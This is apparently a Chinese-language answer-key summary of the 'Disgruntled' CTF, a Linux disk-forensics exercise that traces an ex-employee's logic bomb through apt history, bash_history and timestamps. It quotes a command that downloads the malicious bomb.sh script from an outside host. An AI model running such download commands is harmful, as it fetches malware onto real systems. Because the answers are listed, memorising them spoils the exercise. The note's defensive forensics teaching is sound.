---
title: Disgruntled CTF
contest: Disgruntled CTF
year: 2023
difficulty: easy
vuln_type: forensic_disk
tags: [Linux_apt_install, cybert用户, it-admin, bomb.sh, curl下载, os-update.sh, 蓝队Linux取证]
attack_chain:
  - /usr/bin/apt install dokuwiki - 安装 dokuwiki 包
  - /home/cybert - cybert 用户家目录
  - it-admin - 登录用户名
  - Dec 28 06:27:34 - 攻击时间
  - bomb.sh - 恶意脚本
  - curl 10.10.158.38:8080/bomb.sh --output bomb.sh - 下载方式
  - /bin/os-update.sh - 系统文件
  - Dec 28 06:29 - 后续操作时间
  - goodbye.txt - 留下告别信息
  - 08:00 AM - 离职时间
key_payload: 'curl 10.10.158.38:8080/bomb.sh --output bomb.sh'
one_liner: Disgruntled CTF：10 题 Linux 取证找离职黑客痕迹。
lesson: Linux 取证看 apt 历史 + bash_history + 时间戳对齐；离职黑客常留 goodbye.txt 提示。
quality: medium
---

# Disgruntled CTF

## 来源
- 原文：ctfiot.com/107079.html
- 平台：TryHackMe / CyberDefenders 系列

## 10 题答案

| # | 问题 | 答案 |
|---|------|------|
| 1 | apt install 什么包 | `/usr/bin/apt install dokuwiki` |
| 2 | cybert 用户家目录 | `/home/cybert` |
| 3 | 登录用户名 | `it-admin` |
| 4 | 攻击时间 | `Dec 28 06:27:34` |
| 5 | 恶意脚本名 | `bomb.sh` |
| 6 | 下载方式 | `curl 10.10.158.38:8080/bomb.sh --output bomb.sh` |
| 7 | 系统文件 | `/bin/os-update.sh` |
| 8 | 后续操作时间 | `Dec 28 06:29` |
| 9 | 告别信息 | `goodbye.txt` |
| 10 | 离职时间 | `08:00 AM` |

## 关键技巧
- **apt 历史**：/var/log/apt/history.log
- **bash_history**：~/.bash_history
- **时间戳对齐**：auth.log + bash_history
- **curl 下载**：HTTP 流量审计

## 适用场景
- Linux 取证入门
- 离职调查
- 恶意软件投递分析
